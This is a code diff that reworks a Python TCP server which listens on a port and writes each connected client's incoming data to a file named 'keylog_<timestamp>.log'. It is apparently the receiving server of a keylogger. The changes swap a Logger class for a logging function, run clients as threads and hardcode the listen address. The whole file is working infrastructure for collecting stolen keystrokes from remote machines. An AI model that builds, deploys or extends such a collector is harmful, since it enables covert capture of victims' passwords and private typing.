@@ -5,87 +5,71 @@ import sys
 import threading
 import time
 
-import settings
+
+def logger(prefix: str, message: str) -> None:
+    log_string = (
+        f"{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')} - "
+        f"Logger:{prefix} - {message}"
+    )
+    with open(
+        os.path.join(
+            os.path.normpath(os.path.join(os.path.dirname(__file__), "data\\logs")),
+            "activity.log",
+        ),
+        "a+",
+    ) as log:
+        log.write(log_string + "\n")
+    print(log_string)
 
 
-class Logger:
-    @classmethod
-    def _log(cls, prefix: str, message: str) -> None:
-        log_string = (
-            f"{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')} - "
-            f"Logger:{prefix} - {message}"
-        )
-        with open(os.path.join(get_log_dir(), "activity.log"), "a+") as log:
-            log.write(log_string + "\n")
-        print(log_string)
+class Client(threading.Thread):
+    def __init__(self, conn: socket.socket) -> None:
+        threading.Thread.__init__(self)
+        self.conn = conn
+        self.timestamp = int(time.time())
 
-    @classmethod
-    def info(cls, message: str) -> None:
-        cls._log("INFO", message)
+    @staticmethod
+    def localise_path(path: str) -> str:
+        return os.path.join(os.path.dirname(os.path.realpath(__file__)), path)
 
-    @classmethod
-    def error(cls, message: str) -> None:
-        cls._log("ERROR", message)
-
-    @classmethod
-    def debug(cls, message: str) -> None:
-        if settings.DEBUG:
-            cls._log("DEBUG", message)
-
-
-class Client:
-    def __init__(self, conn: socket.socket, addr: tuple) -> None:
-        self._conn = conn
-        self._addr = addr
-        self._init_timestamp = int(time.time())
-
-    def listen(self) -> None:
-        with open(
-            os.path.join(get_log_dir(), f"keylog_{self._init_timestamp}.log"), "w+"
-        ) as log:
-            log.write("Keylogs for client connected from {}:{}\n\n".format(*self._addr))
-            log.flush()
-            Logger.info("Listening for data from {}:{}".format(*self._addr))
+    def run(self) -> None:
+        log_file = self.localise_path(f"data\\logs\\keylog_{self.timestamp}.log")
+        with open(log_file, mode="wb+", buffering=0) as log:
+            log.write(
+                bytes(
+                    "Client connected from {}:{}\n\n".format(*self.conn.getpeername()),
+                    "utf-8",
+                )
+            )
+            logger(
+                "INFO", "Listening for data from {}:{}".format(*self.conn.getpeername())
+            )
             while True:
                 try:
-                    data = self._conn.recv(1024).decode()
-                    if not data:
-                        break
-                except OSError as error:
-                    Logger.debug(error)
+                    data = self.conn.recv(1024)
+                except OSError:
                     break
                 else:
-                    log.write(data)
-                    log.flush()
-        Logger.info("Disconnection from {}:{}".format(*self._addr))
+                    if not data:
+                        break
+                    else:
+                        log.write(data)
+        logger("INFO", "Disconnection from {}:{}".format(*self.conn.getpeername()))
 
 
-def get_log_dir() -> str:
-    logdir = os.path.normpath(os.path.join(os.path.dirname(__file__), settings.LOG_DIR))
-    if not os.path.exists(logdir):
-        try:
-            os.makedirs(logdir)
-        except PermissionError:
-            return
-    return logdir
-
-
-def main(host: str = "0.0.0.0", port: int = 6000) -> None:
+def main(host: str, port: int) -> None:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ls:
         ls.bind((host, port))
         ls.listen()
-        Logger.info(f"Listening on {host}:{port}")
+        logger("INFO", "Listening on {}:{}".format(*ls.getsockname()))
         while True:
-            conn, addr = ls.accept()
-            Logger.info("Connection from {}:{}".format(*addr))
-            threading.Thread(target=Client(conn, addr).listen).start()
+            conn, _ = ls.accept()
+            logger("INFO", "Connection from {}:{}".format(*conn.getpeername()))
+            Client(conn).start()
 
 
 if __name__ == "__main__":
-    if not get_log_dir():
-        Logger.error("PermissionError: Unable to create log directory.")
-    else:
-        try:
-            main(settings.HOST, settings.PORT)
-        except AttributeError as error:
-            Logger.error(error)
+    try:
+        main("127.0.0.1", 6000)
+    except AttributeError as error:
+        logger("ERROR", error)
